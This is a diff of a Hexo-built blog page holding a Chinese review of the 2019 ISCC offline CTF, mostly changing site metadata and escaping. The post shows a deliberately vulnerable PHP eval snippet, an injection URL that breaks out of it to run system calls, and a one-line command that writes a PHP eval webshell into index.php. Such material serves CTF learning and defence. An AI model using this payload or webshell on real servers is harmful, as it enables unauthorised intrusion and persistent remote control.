@@ -10,7 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -25,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -42,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>2019 ISCC线下赛回顾 - Hexo</title>
+    <title>2019 ISCC线下赛回顾 - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -90,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -149,8 +145,6 @@
                 <span class="date">2018-07-22</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/比赛回顾/">比赛回顾</a>
@@ -172,7 +166,7 @@
 <p>拿到路径之后访问之后是这样的</p>
 <pre><code>&lt;?php
 show_source(__FILE__);
-$a=@$_REQUEST[&#39;a&#39;];
+$a=@$_REQUEST[&apos;a&apos;];
 @eval(&quot;var_dump($$a);&quot;);
 ?&gt;</code></pre><p>先分析一下代码，主要几个函数</p>
 <ul>
@@ -184,32 +178,32 @@ $a=@$_REQUEST[&#39;a&#39;];
 <h3 id="php中单引号与双引号的区别"><a href="#php中单引号与双引号的区别" class="headerlink" title="php中单引号与双引号的区别"></a>php中单引号与双引号的区别</h3><pre><code>&lt;?php
 $c=&quot;Luc1fer!&quot;;
 echo &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //不加引号
-echo &quot;My name is &quot;.&#39;$c&#39;.&quot;&lt;br&gt;&quot;;        //单引号
+echo &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //单引号
 echo &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //双引号
-echo &quot;My name is &quot;.&quot; &#39;$c&#39; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号
-echo &quot;My name is &quot;.&#39; &quot;$c&quot; &#39;.&quot;&lt;br&gt;&quot;; //单引号+双引号
+echo &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号
+echo &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //单引号+双引号
 ?&gt;</code></pre><p>输出结果如下</p>
 <pre><code>My name is Luc1fer!                    //正常显示
 My name is $c                        //单引号不被解析
 My name is Luc1fer!                    //双引号内正常解析
-My name is &#39;Luc1fer!&#39;                //双引号内正常解析
+My name is &apos;Luc1fer!&apos;                //双引号内正常解析
 My name is &quot;$c&quot;                     //单引号内不被解析</code></pre><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>测试代码：</p>
 <pre><code>&lt;?php
 show_source(__FILE__);
 $b=&quot;Hello,my name is Luc1fer!&quot;;
-$a=@$_REQUEST[&#39;a&#39;];
+$a=@$_REQUEST[&apos;a&apos;];
 echo $$a;
 ?&gt;</code></pre><p>结果如下：</p>
 <pre><code> &lt;?php
 show_source(__FILE__);
 $b=&quot;Hello,my name is Luc1fer!&quot;;
-$a=@$_REQUEST[&#39;a&#39;];
+$a=@$_REQUEST[&apos;a&apos;];
 echo $$a;
 ?&gt; Hello,my name is Luc1fer!</code></pre><p>代码的执行过程大概为  <code>get一个a--&gt;echo执行从右到左--&gt;echo $$a--&gt;echo $b--&gt;打印$b</code><br>我们可以通过?a=a=”hello”这样的方式来打印hello</p>
 <h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>对于var_dump()我们可以构造单引号使其闭合</p>
 <pre><code>&lt;?php
 show_source(__FILE__);
-$a=@$_REQUEST[&#39;a&#39;];
+$a=@$_REQUEST[&apos;a&apos;];
 @eval(&quot;var_dump($$a);&quot;);
 ?&gt;
 
@@ -224,7 +218,7 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
 <p>比赛前准备的方法有kill进程、重启Apache、创建同名文件，这些在这次比赛中都没有真正实践到</p>
 <p>3.如何在拿到权限之后批量给别人传马？</p>
 <p>说实话我这个地方还是没懂，按理说应该是利用预留的后门然后执行写入命令</p>
-<pre><code>echo -e &quot;&lt;?php eval(\@_POST[&#39;a&#39;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>
+<pre><code>echo -e &quot;&lt;?php eval(\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>
 
     </div>
 
@@ -238,16 +232,6 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
     
 
     <!-- Comments -->
-    
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
     
 
 </div>
@@ -268,7 +252,7 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -289,7 +273,7 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -307,11 +291,11 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -387,18 +371,6 @@ http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
